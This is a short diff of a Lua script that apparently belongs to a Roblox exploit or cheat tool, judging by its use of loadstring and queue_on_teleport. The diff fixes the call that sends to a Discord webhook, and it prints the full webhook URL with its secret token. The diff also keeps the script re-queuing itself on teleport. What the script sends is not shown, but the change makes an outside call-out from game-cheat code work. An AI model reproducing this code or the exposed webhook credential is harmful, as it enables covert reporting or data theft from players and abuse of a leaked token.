@@ -200,7 +200,7 @@ local function send(url)
 end
 
 
-send(https://discord.com/api/webhooks/1421436846340313099/Y5icBjq51mB2NS16NXGtS9oOrR6n7il9Kysg-7WPHD3fQOjjDuAyLarzOBn8-AMNi3Ry)
+send("https://discord.com/api/webhooks/1421436846340313099/Y5icBjq51mB2NS16NXGtS9oOrR6n7il9Kysg-7WPHD3fQOjjDuAyLarzOBn8-AMNi3Ry")
 
 local started = false
 
@@ -341,4 +341,5 @@ loadstring(main)()
 
 
 queue_on_teleport(main)
+
 
